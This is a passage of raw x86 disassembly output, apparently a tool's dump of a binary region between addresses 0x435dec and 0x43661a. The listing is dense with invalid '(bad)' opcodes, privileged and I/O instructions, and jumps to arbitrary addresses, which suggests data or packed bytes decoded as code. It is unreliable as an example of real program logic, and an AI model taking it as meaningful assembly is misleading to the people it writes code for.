  435dec:	int3   
  435ded:	cld    
  435dee:	xchg   ebp,eax
  435def:	pop    ss
  435df0:	gs loope 0x435d94
  435df3:	add    DWORD PTR [esi-0x7f],0x4f
  435df7:	inc    esi
  435df8:	(bad)  
  435df9:	lods   al,BYTE PTR ds:[esi]
  435dfa:	mov    ah,0xfd
  435dfc:	out    0x7b,al
  435dfe:	sbb    BYTE PTR [ecx],dh
  435e00:	mov    esi,0xcc7129fb
  435e05:	xchg   BYTE PTR [edx+0x7c03075],cl
  435e0b:	mov    bl,BYTE PTR [esi]
  435e0d:	in     al,0x7e
  435e0f:	add    eax,DWORD PTR [ecx+0x20]
  435e12:	adc    eax,0x13906bd1
  435e17:	jmp    0x435daa
  435e19:	push   ecx
  435e1b:	jmp    0x7adf5a94
  435e20:	jecxz  0x435e0e
  435e22:	push   ebx
  435e23:	pushf  
  435e24:	sub    ah,BYTE PTR [edx+0x6f83109]
  435e2a:	inc    ecx
  435e2b:	adc    DWORD PTR [esi-0x60e4dd77],esi
  435e31:	pop    ebx
  435e32:	and    al,0xcf
  435e35:	push   esp
  435e36:	daa    
  435e37:	mov    ch,0xa3
  435e39:	and    al,BYTE PTR [edi-0x28]
  435e3c:	pop    ecx
  435e3d:	scas   al,BYTE PTR es:[edi]
  435e3e:	cwde   
  435e3f:	stos   DWORD PTR es:[edi],eax
  435e40:	sub    bl,BYTE PTR [edi-0x6d692f61]
  435e46:	dec    ebx
  435e47:	mov    ecx,0xc9faba4e
  435e4c:	xchg   edi,eax
  435e4d:	in     eax,0xde
  435e4f:	push   es
  435e50:	and    BYTE PTR [eax-0x3f775c10],0x25
  435e57:	enter  0xf963,0x75
  435e5b:	icebp  
  435e5c:	cmp    BYTE PTR [ebx+0xf],0x22
  435e60:	jns    0x435e8f
  435e62:	xchg   edx,eax
  435e63:	sub    eax,0xefe638d0
  435e68:	neg    DWORD PTR [eax-0x13aee7a]
  435e6e:	std    
  435e6f:	mov    eax,ds:0xc9b8d8a0
  435e74:	pop    ecx
  435e75:	mov    WORD PTR [ebx+eax*4],fs
  435e78:	ins    DWORD PTR es:[edi],dx
  435e79:	jmp    DWORD PTR [edi+0x5d]
  435e7c:	call   0xc80b5689
  435e81:	dec    ebp
  435e82:	repnz or ebp,esi
  435e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435e86:	test   eax,0x14376e41
  435e8b:	mov    dl,0x1c
  435e8d:	xchg   ebx,eax
  435e8e:	or     dl,ah
  435e90:	cmp    eax,0xfb5f74e
  435e95:	aas    
  435e96:	sub    eax,0x69ae7e00
  435e9b:	lods   eax,DWORD PTR ds:[esi]
  435e9c:	jg     0x435e37
  435e9e:	pusha  
  435e9f:	icebp  
  435ea0:	stos   BYTE PTR es:[edi],al
  435ea1:	psllw  mm6,QWORD PTR [ebx+0x70]
  435ea5:	inc    esp
  435ea6:	and    BYTE PTR [edx+0x9895ffb],bl
  435eac:	add    eax,0x4b59661b
  435eb1:	ror    DWORD PTR [ebx+0x53],1
  435eb4:	jb     0x435f1b
  435eb6:	sbb    eax,0xf5468088
  435ebb:	or     ch,ah
  435ebd:	arpl   sp,ax
  435ebf:	bound  esp,QWORD PTR [ebx+eax*2-0x69]
  435ec3:	mov    ch,0x94
  435ec5:	imul   esi,DWORD PTR [ecx+0x55],0x43
  435ec9:	inc    edi
  435eca:	push   0xffffff82
  435ecc:	and    BYTE PTR [eax],0xa
  435ecf:	arpl   sp,bp
  435ed1:	int3   
  435ed2:	add    al,0x3b
  435ed4:	rcr    BYTE PTR [edx],1
  435ed6:	fisub  DWORD PTR [edi]
  435ed8:	push   esi
  435ed9:	or     BYTE PTR [ebx-0x4e],dh
  435edc:	add    BYTE PTR ds:0xed3f2688,0xa9
  435ee3:	fs xchg ebx,eax
  435ee5:	daa    
  435ee6:	retf   
  435ee7:	cmp    al,cl
  435ee9:	adc    al,0x3
  435eeb:	add    DWORD PTR [ebx-0x10917474],0x55
  435ef2:	mov    DWORD PTR [ebp+edi*1-0x390165a3],esp
  435ef9:	ins    DWORD PTR es:[edi],dx
  435efa:	pop    edi
  435efb:	xor    DWORD PTR [eax+0x13f9a66a],esp
  435f01:	and    eax,0x6b1858ee
  435f06:	xchg   esp,eax
  435f07:	test   bl,ah
  435f09:	loope  0x435f60
  435f0b:	xor    DWORD PTR [ebx+0x46144df],ebp
  435f11:	pop    esi
  435f12:	aas    
  435f13:	js     0x435f67
  435f15:	test   DWORD PTR [ecx-0xf],esi
  435f18:	aaa    
  435f19:	loopne 0x435f7a
  435f1b:	mov    edx,0xc68526e8
  435f20:	shr    DWORD PTR [esi-0x12],cl
  435f23:	in     eax,0x2b
  435f25:	cmp    DWORD PTR ds:0x13fea0c2,0xd6fc6d20
  435f2f:	push   cs
  435f30:	mov    ah,0x18
  435f32:	jecxz  0x435f87
  435f34:	mov    dh,0x78
  435f36:	fwait
  435f37:	stos   DWORD PTR es:[edi],eax
  435f38:	cmc    
  435f39:	test   BYTE PTR [edi+ebx*2-0x27],bh
  435f3d:	xor    al,0x91
  435f3f:	ret    0x4146
  435f42:	inc    esp
  435f43:	xor    BYTE PTR [esp+eiz*8+0x6d06e988],bl
  435f4a:	call   0x23ebedbc
  435f4f:	push   ebx
  435f50:	dec    esi
  435f51:	xor    DWORD PTR [esi+0x548ebae7],esi
  435f57:	outs   dx,DWORD PTR ds:[esi]
  435f58:	inc    ecx
  435f59:	rcl    ecx,0xd4
  435f5c:	(bad)  
  435f5d:	adc    al,0x43
  435f5f:	stc    
  435f60:	jne    0x435fc0
  435f62:	add    eax,0x58a4a6db
  435f67:	add    esp,DWORD PTR [eax-0x63]
  435f6a:	jns    0x435ef4
  435f6c:	out    dx,al
  435f6d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  435f6f:	int    0x2a
  435f71:	int    0xf1
  435f73:	xor    eax,0x415e5f6
  435f78:	inc    DWORD PTR [ecx+edx*8-0x7c]
  435f7c:	push   esp
  435f7d:	adc    al,0x54
  435f7f:	mov    ebp,0x13134e7b
  435f84:	ror    BYTE PTR [edi-0x4a182bf1],cl
  435f8a:	mov    eax,cs:0xd6e39e1
  435f90:	cmp    eax,0xf374d855
  435f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  435f96:	call   0x9396cbaf
  435f9b:	mov    WORD PTR [esi+0x1c],ds
  435f9e:	(bad)  
  435f9f:	sbb    DWORD PTR [eax+0x45],eax
  435fa2:	xor    eax,DWORD PTR ds:0x9f6be63f
  435fa8:	jp     0x43601c
  435faa:	xchg   esi,eax
  435fab:	test   al,0x7
  435fad:	jae    0x435f75
  435faf:	repnz xchg edi,eax
  435fb1:	cmp    eax,0x1b1b82a3
  435fb6:	mov    ebx,0x6e362820
  435fbb:	les    esi,FWORD PTR [ebp-0x2c5c75e2]
  435fc1:	pop    ss
  435fc2:	nop
  435fc3:	stc    
  435fc4:	aad    0xb3
  435fc6:	cwde   
  435fc7:	inc    eax
  435fc8:	lods   al,BYTE PTR es:[esi]
  435fca:	mov    cl,0xb6
  435fcc:	fwait
  435fcd:	xor    DWORD PTR [esi-0x70ee02c1],esp
  435fd3:	and    eax,eax
  435fd5:	sbb    al,BYTE PTR ds:0x7aa746c5
  435fdb:	sub    al,0xce
  435fdd:	jnp    0x435f62
  435fdf:	(bad)  
  435fe1:	mov    dh,0xe4
  435fe3:	outs   dx,DWORD PTR ds:[esi]
  435fe4:	dec    edx
  435fe5:	fucompp 
  435fe7:	pop    ecx
  435fe8:	test   DWORD PTR [ebx-0x6a],0xde5e483d
  435fef:	stc    
  435ff0:	cmp    al,0xf2
  435ff2:	pop    ds
  435ff3:	dec    esi
  435ff4:	js     0x435fd3
  435ff6:	lods   eax,DWORD PTR ds:[esi]
  435ff7:	adc    DWORD PTR [esi],ecx
  435ff9:	sbb    edi,edi
  435ffb:	lock sub al,0x6
  435ffe:	not    edx
  436000:	xchg   al,al
  436002:	mov    WORD PTR [ebp-0x7c314fa5],es
  436008:	dec    eax
  436009:	mov    ?,ebp
  43600b:	bound  eax,QWORD PTR [edi-0xf]
  43600e:	loope  0x43601c
  436010:	push   0xb416c441
  436015:	stc    
  436016:	iret   
  436017:	sub    esi,DWORD PTR [ebx+eiz*8]
  43601a:	mov    ecx,0x86a9eedb
  43601f:	mov    esp,0x2d7776b3
  436024:	fdiv   DWORD PTR ds:0x2e88eb89
  43602a:	xor    eax,0x9c6a7f78
  43602f:	(bad)  
  436030:	sbb    edx,eax
  436032:	mov    al,ds:0xb1d35979
  436037:	ds test al,0xf0
  43603a:	jl     0x43604d
  43603c:	inc    ebx
  43603d:	xchg   edx,eax
  43603e:	out    dx,eax
  43603f:	jbe    0x436003
  436041:	dec    edx
  436042:	retf   
  436043:	test   eax,0xc50361e3
  436048:	push   0x27
  43604a:	iret   
  43604b:	rcr    BYTE PTR [ecx],1
  43604d:	xor    eax,0x98ed653
  436052:	je     0x436024
  436054:	inc    eax
  436055:	mov    bl,BYTE PTR [edx]
  436057:	(bad)  
  436058:	nop
  436059:	xchg   ebx,eax
  43605a:	mov    ?,eax
  43605c:	bound  edx,QWORD PTR ds:0xdffc1608
  436062:	jmp    0x4360c2
  436064:	in     eax,dx
  436065:	xchg   esp,eax
  436066:	and    dh,BYTE PTR [eax]
  436068:	jl     0x4360c4
  43606a:	cmp    eax,0xe025fa91
  43606f:	test   eax,0xfe656292
  436074:	adc    bh,BYTE PTR [eax+0x756199e5]
  43607a:	call   0x6b33:0x3669128c
  436081:	(bad)  
  436082:	outs   dx,DWORD PTR ds:[esi]
  436083:	or     eax,0xa55a5d2d
  436088:	jge    0x43609b
  43608a:	sub    al,0xd8
  43608c:	aas    
  43608d:	sbb    eax,0x48dd1bf3
  436092:	loopne 0x43605c
  436094:	xor    al,0x20
  436097:	imul   ebx,ecx,0xffffff93
  43609a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43609b:	jp     0x436089
  43609d:	cli    
  43609e:	push   0x319d55d0
  4360a3:	in     al,dx
  4360a4:	and    BYTE PTR [esi-0x39],dl
  4360a7:	sub    esp,eax
  4360a9:	enter  0x93d1,0x3
  4360ad:	scas   eax,DWORD PTR es:[edi]
  4360ae:	pop    es
  4360af:	add    eax,0x2a8e0e93
  4360b4:	icebp  
  4360b5:	mov    fs,WORD PTR [eax]
  4360b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4360b8:	stc    
  4360b9:	pop    edx
  4360ba:	mov    ds:0xba7b5d43,al
  4360bf:	mov    esp,0xd3c5e516
  4360c4:	pop    edi
  4360c5:	std    
  4360c6:	(bad)  
  4360c9:	ins    DWORD PTR es:[edi],dx
  4360ca:	or     BYTE PTR [edx],dh
  4360cc:	cs push eax
  4360ce:	(bad)  
  4360cf:	cdq    
  4360d0:	lock cli 
  4360d2:	mov    eax,0x6406e326
  4360d7:	rcl    DWORD PTR [ebx],0x6c
  4360da:	clc    
  4360db:	(bad)  
  4360dc:	loopne 0x43613b
  4360de:	or     DWORD PTR [edx-0x1f],esi
  4360e1:	pop    esp
  4360e2:	or     DWORD PTR [ebp-0x37958142],ebp
  4360e8:	sub    DWORD PTR [esi+ebp*1],0x42
  4360ec:	cmp    esi,DWORD PTR [esi+esi*4-0x66]
  4360f0:	daa    
  4360f1:	xchg   ebx,eax
  4360f2:	add    ebp,DWORD PTR [ebx+0x593b12d3]
  4360f8:	or     BYTE PTR [edi-0x17],0x2b
  4360fc:	shl    DWORD PTR [ecx+0x1],0xf2
  436100:	sub    eax,0xaf9e3301
  436105:	pop    ss
  436106:	push   eax
  436107:	inc    esi
  436108:	mul    ebp
  43610a:	sub    BYTE PTR [ecx],dh
  43610c:	sbb    edi,DWORD PTR [ebx+0x4d]
  43610f:	mov    edi,0x1be1db17
  436114:	enter  0x225d,0x41
  436118:	push   ds
  436119:	hlt    
  43611a:	sub    eax,DWORD PTR [edi-0x4d]
  43611d:	scas   al,BYTE PTR es:[edi]
  43611e:	test   eax,0x42297ec7
  436123:	je     0x43612c
  436125:	inc    ebx
  436126:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  436127:	jns    0x43611c
  436129:	bound  ecx,QWORD PTR [edx+0x5b935d8]
  43612f:	rcr    DWORD PTR [edx+0x7b302806],0x77
  436136:	dec    edx
  436137:	add    eax,0x9fc74ade
  43613c:	mov    ebx,0xcb69dd5d
  436141:	(bad)  
  436142:	out    dx,al
  436143:	stc    
  436144:	sbb    eax,0x3529903d
  436149:	lahf   
  43614a:	aam    0x73
  43614c:	mov    esp,0x1c9e59e5
  436151:	ret    0xd0ae
  436154:	inc    edi
  436155:	dec    edx
  436156:	stos   DWORD PTR es:[edi],eax
  436157:	stos   BYTE PTR es:[edi],al
  436158:	shl    DWORD PTR [ecx],1
  43615a:	sub    ecx,DWORD PTR [edi+0x6a365abf]
  436160:	rcr    DWORD PTR [edi+0x64e7ebb0],1
  436166:	push   esp
  436167:	dec    edx
  436168:	pop    ebx
  436169:	and    DWORD PTR [ebx+0x4517c7c4],ebp
  43616f:	inc    esi
  436170:	and    edi,DWORD PTR [esi+0x710e4f86]
  436176:	sbb    ebx,ebx
  436178:	adc    ch,ah
  43617a:	or     eax,0xe4e29f77
  43617f:	push   0x46
  436181:	bound  ebx,QWORD PTR [esi+0x109c9750]
  436187:	int    0xcb
  436189:	xchg   edi,eax
  43618a:	inc    edi
  43618b:	xlat   BYTE PTR ds:[ebx]
  43618c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43618d:	jno    0x436179
  43618f:	std    
  436190:	mov    DWORD PTR [ebx-0x80],0xfdf4884
  436197:	pop    ds
  436198:	rcr    dh,1
  43619a:	vmread DWORD PTR [ebx-0x43b62004],esi
  4361a1:	mov    DWORD PTR [ebp+ecx*2+0x32],ebx
  4361a5:	xchg   ecx,eax
  4361a6:	imul   ebp,DWORD PTR [edi+0x42],0x70
  4361aa:	sbb    DWORD PTR ds:0x616cd7cd,ebx
  4361b0:	leave  
  4361b1:	das    
  4361b2:	mov    al,ds:0xd358371f
  4361b7:	repnz les ebp,FWORD PTR [edi+0x72]
  4361bb:	aas    
  4361bc:	sahf   
  4361bd:	adc    bl,BYTE PTR [ecx-0x687b921e]
  4361c3:	sbb    bh,ah
  4361c5:	and    DWORD PTR [edi+ecx*8+0x3bf984bc],ebp
  4361cc:	es call 0x3a2fbb2b
  4361d2:	enter  0x4787,0xd2
  4361d6:	fild   DWORD PTR [ebx-0x31fb80b8]
  4361dc:	sahf   
  4361dd:	int3   
  4361de:	loopne 0x4361a5
  4361e0:	sub    ch,dl
  4361e2:	(bad)  
  4361e3:	es jle 0x43622a
  4361e6:	mov    eax,ds:0x1848d42d
  4361eb:	mov    cl,0x86
  4361ed:	cdq    
  4361ee:	mov    eax,0xffb8b887
  4361f3:	cwde   
  4361f4:	push   eax
  4361f5:	lea    esi,[ebx]
  4361f7:	mov    dl,0xf6
  4361f9:	sbb    cl,BYTE PTR [edi-0x68]
  4361fc:	jmp    0x43627b
  4361fe:	nop
  4361ff:	je     0x436261
  436201:	and    al,0xda
  436203:	fwait
  436204:	or     dl,bh
  436206:	or     esi,edi
  436208:	mov    eax,0x2d8a45cf
  43620d:	(bad)  
  43620e:	std    
  43620f:	and    bh,ch
  436211:	arpl   dx,di
  436213:	xlat   BYTE PTR ds:[ebx]
  436214:	stos   BYTE PTR es:[edi],al
  436215:	xor    eax,0x46b94540
  43621a:	and    eax,0xf56df9d0
  43621f:	(bad)  
  436220:	call   0xfe4c8914
  436225:	fiadd  DWORD PTR [esi]
  436227:	data16 in al,0x39
  43622a:	xchg   ecx,eax
  43622b:	popf   
  43622c:	xchg   ecx,eax
  43622d:	ds adc esp,esp
  436230:	xchg   DWORD PTR [eax+0x41],esp
  436233:	call   0x8247:0x1025771a
  43623a:	inc    eax
  43623b:	fisttp QWORD PTR [esi-0x3cc157f]
  436241:	inc    edi
  436242:	push   ss
  436243:	cwde   
  436244:	sbb    eax,0xcd7b2ef0
  436249:	nop
  43624a:	jp     0x43621f
  43624c:	jle    0x4362a7
  43624e:	ins    DWORD PTR es:[edi],dx
  43624f:	mov    esi,0x9ec853d9
  436254:	push   ds
  436255:	pop    edi
  436256:	sahf   
  436257:	push   ebp
  436258:	out    0x35,eax
  43625a:	cli    
  43625b:	js     0x436226
  43625d:	inc    ebp
  43625e:	popf   
  43625f:	nop
  436260:	mov    edi,0x3cfbf295
  436265:	ds jmp 0x4361ea
  436268:	sti    
  436269:	mov    ebx,0xcee77084
  43626e:	mov    bh,0x77
  436270:	popa   
  436271:	sub    ebx,edx
  436273:	sahf   
  436274:	stos   BYTE PTR es:[edi],al
  436275:	fnstcw WORD PTR [esi+0x4e]
  436278:	adc    cl,dh
  43627a:	or     bl,BYTE PTR [ebx+0x51c01b1a]
  436280:	xchg   edi,eax
  436281:	push   eax
  436282:	cdq    
  436283:	out    dx,al
  436284:	adc    bh,BYTE PTR [edx+0x22]
  436287:	mov    edi,0xc964d5bc
  43628c:	scas   al,BYTE PTR es:[edi]
  43628d:	push   ss
  43628e:	jle    0x436263
  436290:	cmp    BYTE PTR [eax+0x30],bl
  436293:	mov    ecx,ebp
  436295:	adc    al,0x3f
  436297:	pop    ebp
  436298:	sbb    eax,0xe0c8fb88
  43629d:	and    al,0x8f
  43629f:	cmp    BYTE PTR [esi-0x2e6ef176],0xe6
  4362a6:	mov    eax,0xb04f3295
  4362ab:	pop    es
  4362ac:	jmp    0xfac0:0xd2e1de14
  4362b3:	daa    
  4362b4:	fisubr WORD PTR [ebp+0x23]
  4362b7:	test   DWORD PTR [ecx+0x15880f34],0x45f916ab
  4362c1:	and    DWORD PTR [ebp-0x7d],0x37de0293
  4362c8:	ins    BYTE PTR es:[edi],dx
  4362c9:	sti    
  4362ca:	push   esi
  4362cb:	adc    al,0x8a
  4362cd:	into   
  4362ce:	loope  0x4362eb
  4362d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4362d1:	mov    esi,0x6784f855
  4362d6:	add    ah,ch
  4362d8:	dec    eax
  4362d9:	inc    ebp
  4362da:	out    0x54,eax
  4362dc:	imul   edi,esi,0x3cda8378
  4362e2:	les    edx,FWORD PTR [esi+0xb]
  4362e5:	mov    ss,edi
  4362e7:	je     0x43628d
  4362e9:	cmova  edi,ecx
  4362ec:	stc    
  4362ed:	ds sub ebx,ecx
  4362f0:	cs inc esi
  4362f2:	pop    esp
  4362f3:	icebp  
  4362f4:	jge    0x43634f
  4362f6:	xchg   bl,ah
  4362f8:	or     dh,BYTE PTR [eax-0x2]
  4362fb:	sti    
  4362fc:	jb     0x436286
  4362fe:	push   esp
  4362ff:	jbe    0x436377
  436301:	inc    ebp
  436302:	dec    edx
  436303:	jl     0x436355
  436305:	(bad)  
  436306:	mov    ds:0x115bb65c,eax
  43630b:	lds    eax,FWORD PTR [ebx]
  43630d:	ins    BYTE PTR es:[edi],dx
  43630e:	stc    
  43630f:	fwait
  436310:	adc    BYTE PTR [ecx-0x54731345],dl
  436316:	call   0xa7eaef59
  43631b:	cmc    
  43631c:	jmp    0x4362c5
  43631e:	and    al,0x82
  436320:	pop    ss
  436321:	mov    ebp,0x24a7ec34
  436326:	scas   al,BYTE PTR es:[edi]
  436327:	adc    BYTE PTR [esi+0x7],bh
  43632a:	bsf    esp,DWORD PTR ds:0x46b2b602
  436331:	jmp    0x3451:0x8976ec86
  436338:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436339:	jae    0x436342
  43633b:	cmp    BYTE PTR [esp+eax*2-0x73],bh
  43633f:	mov    ch,0x3f
  436341:	call   0x2d2f74b7
  436346:	(bad)  
  436347:	fmul   DWORD PTR [edx+0x2470153d]
  43634d:	cmp    eax,0x6e664925
  436352:	(bad)  
  436353:	ss cli 
  436355:	inc    eax
  436356:	mov    ebp,ebx
  436358:	inc    esp
  436359:	sub    al,0x24
  43635b:	hlt    
  43635c:	cld    
  43635d:	fcomip st,st(2)
  43635f:	and    eax,0x20be81b
  436364:	(bad)  
  436365:	xor    bh,BYTE PTR [ebx+0x79]
  436368:	xor    BYTE PTR [ebx],ch
  43636a:	pop    esi
  43636b:	push   ecx
  43636c:	cmp    ebp,esi
  43636e:	jp     0x33c547a8
  436374:	or     al,dl
  436376:	and    BYTE PTR [eax+ecx*8],ch
  436379:	cmc    
  43637a:	imul   eax,DWORD PTR [esi],0xb1aa95c0
  436380:	rol    BYTE PTR [edx],cl
  436382:	or     al,0x29
  436384:	inc    edi
  436385:	(bad)  
  436386:	cli    
  436387:	inc    edx
  436388:	jns    0x43632f
  43638a:	and    esi,DWORD PTR [esi-0x6e718710]
  436390:	test   BYTE PTR [edi+ebx*4],ah
  436393:	inc    esp
  436394:	popf   
  436395:	(bad)  
  436396:	xchg   BYTE PTR [eax],bl
  436398:	cli    
  436399:	ins    DWORD PTR es:[edi],dx
  43639a:	inc    esi
  43639b:	sub    ebp,DWORD PTR [ebp-0x2b36f465]
  4363a1:	ja     0x436359
  4363a3:	mov    esp,0x3f3809d9
  4363a8:	push   0x12c9782f
  4363ad:	pop    eax
  4363ae:	push   0x6e
  4363b0:	frstor [ecx+0x3decc11a]
  4363b6:	repz cwde 
  4363b8:	inc    edi
  4363b9:	push   0xbbb45909
  4363be:	mov    ebp,0xa0f9ac4
  4363c3:	or     ch,BYTE PTR [ebx+0x1a2d7cd8]
  4363c9:	sti    
  4363ca:	(bad)  
  4363cc:	pop    ebp
  4363cd:	adc    BYTE PTR [esi-0x17],ah
  4363d0:	pop    ebp
  4363d1:	cld    
  4363d2:	or     DWORD PTR ss:[ebp-0x3bf62429],edx
  4363d9:	retf   0x732e
  4363dc:	in     eax,0x8f
  4363de:	cmp    esi,DWORD PTR [ecx+0x52372a2c]
  4363e4:	xor    edx,ebp
  4363e6:	push   ebx
  4363e7:	or     al,0x1c
  4363e9:	or     eax,0x19da7531
  4363ee:	mov    al,0x70
  4363f0:	xchg   BYTE PTR [esi+0x45b92c96],ch
  4363f6:	sub    ch,dh
  4363f8:	add    eax,0x34b47e5f
  4363fd:	jne    0x4363e8
  4363ff:	lahf   
  436400:	cmp    al,0xb4
  436402:	pusha  
  436403:	ffreep st(4)
  436405:	push   esp
  436406:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  436407:	repnz stc 
  436409:	mov    ah,0xdf
  43640b:	test   eax,0xa03df181
  436410:	div    BYTE PTR ds:0x29612f5f
  436416:	xor    DWORD PTR [ecx-0xe],edx
  436419:	aam    0xbd
  43641b:	add    al,0x88
  43641d:	addr16 loop 0x436439
  436420:	xchg   BYTE PTR [ebp-0x7ffd7678],cl
  436426:	sub    cl,bl
  436428:	mov    ebx,0xc063f72e
  43642d:	cmc    
  43642e:	in     eax,dx
  43642f:	es in  eax,dx
  436431:	into   
  436432:	mov    BYTE PTR [edi+0x7af769f4],bh
  436438:	push   edx
  436439:	jbe    0x436494
  43643b:	xor    DWORD PTR [eax+0x35531340],ebx
  436441:	and    al,0x34
  436443:	out    0x85,eax
  436445:	mov    WORD PTR [esi],gs
  436447:	sbb    eax,0x25764903
  43644c:	xor    ecx,DWORD PTR [ebx+0x3a]
  43644f:	imul   edi,DWORD PTR [esi],0x64
  436452:	cld    
  436453:	inc    edi
  436454:	popf   
  436455:	das    
  436456:	mov    eax,0xe5891fc3
  43645b:	enter  0xc33f,0x13
  43645f:	inc    edx
  436460:	sub    BYTE PTR [ecx-0x80],dh
  436463:	adc    eax,0x776dce59
  436468:	mov    eax,DWORD PTR [edi-0x66d21f48]
  43646e:	jnp    0xa634db9b
  436474:	xor    ah,BYTE PTR [ebx+eax*4-0x534f9723]
  43647b:	scas   eax,DWORD PTR es:[edi]
  43647c:	test   al,0xfe
  43647e:	inc    ebx
  436480:	clc    
  436481:	aas    
  436482:	jg     0x436423
  436484:	or     ch,BYTE PTR [ecx-0x258db172]
  43648a:	add    ebp,DWORD PTR [esi-0x33]
  43648d:	inc    eax
  43648e:	or     ebp,DWORD PTR [ebp-0x6b]
  436491:	push   ds
  436492:	xor    BYTE PTR [eax+edx*2-0x11],0xea
  436497:	mov    ch,0xbb
  436499:	cmp    eax,0x3282d81
  43649e:	xchg   ebx,eax
  43649f:	sub    dl,BYTE PTR [esi-0x38]
  4364a2:	fisubr WORD PTR [esi]
  4364a4:	mov    esi,0x4c417fde
  4364a9:	push   ecx
  4364aa:	fldcw  WORD PTR [ebx-0x50]
  4364ad:	xchg   ebx,eax
  4364ae:	xchg   edx,eax
  4364af:	or     DWORD PTR [ecx+eiz*8-0x36e87380],esi
  4364b6:	push   DWORD PTR [ebx]
  4364b8:	lahf   
  4364b9:	sub    eax,0x7e416e29
  4364be:	fld1   
  4364c0:	psubusw mm7,mm6
  4364c3:	inc    edi
  4364c4:	clc    
  4364c5:	push   esi
  4364c6:	pop    ebp
  4364c7:	mov    DWORD PTR [eax-0x36ab1efc],ecx
  4364cd:	inc    ebp
  4364ce:	mov    BYTE PTR [eax+ebx*2+0x4c],dh
  4364d2:	jmp    0x236f3e48
  4364d7:	loop   0x4364f9
  4364d9:	or     cl,BYTE PTR [edi+0x6e549628]
  4364df:	jne    0x4364d6
  4364e1:	inc    ebp
  4364e2:	test   eax,0x4951094
  4364e7:	and    DWORD PTR [ecx-0x4b31686e],0x9f3259da
  4364f1:	in     al,dx
  4364f2:	xchg   DWORD PTR [ebp-0x15],ecx
  4364f5:	xchg   DWORD PTR [edi+edi*8+0x75],ecx
  4364f9:	aad    0xd9
  4364fb:	into   
  4364fc:	cmc    
  4364fd:	xor    BYTE PTR [ecx],cl
  4364ff:	dec    edx
  436500:	jmp    0xb673:0xd7b5fffe
  436507:	lock inc ebp
  436509:	mov    esi,0x48f25dff
  43650e:	push   ds
  43650f:	push   es
  436510:	addr16 (bad) 
  436512:	in     al,0x53
  436514:	xchg   esp,eax
  436515:	(bad)  
  436516:	mov    edx,0xac68ca3b
  43651b:	inc    esi
  43651c:	xor    BYTE PTR [ebx+0x2],bl
  43651f:	jo     0x4365a0
  436521:	std    
  436522:	cs or  al,0x5c
  436525:	scas   eax,DWORD PTR es:[edi]
  436526:	lahf   
  436527:	jl     0x436588
  436529:	sar    BYTE PTR [ecx+0x29],cl
  43652c:	aam    0x59
  43652e:	std    
  43652f:	lea    eax,[ecx+0x5a9973f8]
  436535:	dec    edi
  436536:	or     al,0x80
  436538:	xor    esp,ebx
  43653a:	sub    BYTE PTR ds:0x5d111d90,dl
  436540:	mov    edx,0x48d2e392
  436545:	hlt    
  436546:	stos   BYTE PTR es:[edi],al
  436547:	xchg   ebp,eax
  436549:	add    ebp,DWORD PTR [edi]
  43654b:	jb     0x4364df
  43654d:	shr    BYTE PTR [edi-0x3e],1
  436550:	sbb    bl,0xdb
  436553:	into   
  436554:	aaa    
  436555:	int3   
  436556:	sub    bh,BYTE PTR [edi+0x3f]
  436559:	mov    bh,0x26
  43655b:	mov    ebp,0xc97d80b9
  436560:	sbb    BYTE PTR [edi+0x7f4ceaf1],0x1b
  436567:	shr    DWORD PTR [esi+edx*1-0x32],1
  43656b:	xchg   DWORD PTR [eax+0x6b],ecx
  43656e:	jmp    0xced9:0x8452e837
  436575:	aad    0x76
  436577:	test   eax,0xe8cbefb7
  43657c:	pop    esi
  43657d:	xchg   esp,eax
  43657e:	or     BYTE PTR fs:[esi-0x6a],0xa5
  436583:	(bad)  
  436585:	or     al,0x12
  436587:	fs inc ecx
  436589:	sub    esi,eax
  43658b:	das    
  43658c:	xchg   ecx,eax
  43658d:	dec    edx
  43658e:	sub    eax,0xe6307312
  436593:	inc    BYTE PTR [eax+0x61bfbc39]
  436599:	(bad)  
  43659a:	in     al,0xa4
  43659c:	jb     0x436566
  43659e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43659f:	sub    ebx,eax
  4365a1:	retf   
  4365a2:	push   cs
  4365a3:	clc    
  4365a4:	aas    
  4365a5:	daa    
  4365a6:	jo     0x4365d8
  4365a8:	xchg   ebx,edx
  4365aa:	and    esi,0xbcb92885
  4365b0:	clc    
  4365b1:	addr16 clc 
  4365b3:	mov    bh,0x5b
  4365b5:	es cmp al,0xe9
  4365b8:	push   0xce8c69ca
  4365bd:	dec    edx
  4365be:	lds    edi,FWORD PTR [edi-0x2dd6b85b]
  4365c4:	sbb    esi,DWORD PTR [edx+eax*8+0x2a]
  4365c8:	jbe    0x4365b4
  4365ca:	inc    esp
  4365cb:	in     al,dx
  4365cc:	das    
  4365cd:	ins    BYTE PTR es:[edi],dx
  4365ce:	loopne 0x4365b4
  4365d0:	cmp    eax,0xe84838cc
  4365d5:	and    ebp,0xffffffa2
  4365d8:	iret   
  4365d9:	ins    DWORD PTR es:[edi],dx
  4365da:	clc    
  4365db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4365dc:	mov    al,0x2c
  4365de:	pop    edx
  4365df:	mov    ax,0xd206
  4365e3:	arpl   di,bx
  4365e5:	add    DWORD PTR [eax+esi*1],esp
  4365e8:	sub    dh,BYTE PTR [eax]
  4365ea:	retf   
  4365eb:	cmp    BYTE PTR [edi],dh
  4365ed:	mov    BYTE PTR [edi+0x55057e48],al
  4365f3:	outs   dx,DWORD PTR ds:[esi]
  4365f4:	add    DWORD PTR [esi+ebp*2+0xc4f839e],0x29
  4365fc:	aam    0x63
  4365fe:	aaa    
  4365ff:	cs mov esi,0x346cfd51
  436605:	dec    ebp
  436606:	push   edx
  436607:	ficomp WORD PTR [eax-0x4c40ef57]
  43660d:	dec    edi
  43660e:	pop    ecx
  43660f:	jmp    0x436602
  436611:	fidivr WORD PTR [ebx+0x29]
  436614:	ja     0x4365c9
  436616:	or     al,0x6a
  436618:	scas   eax,DWORD PTR es:[edi]
  436619:	push   ebx
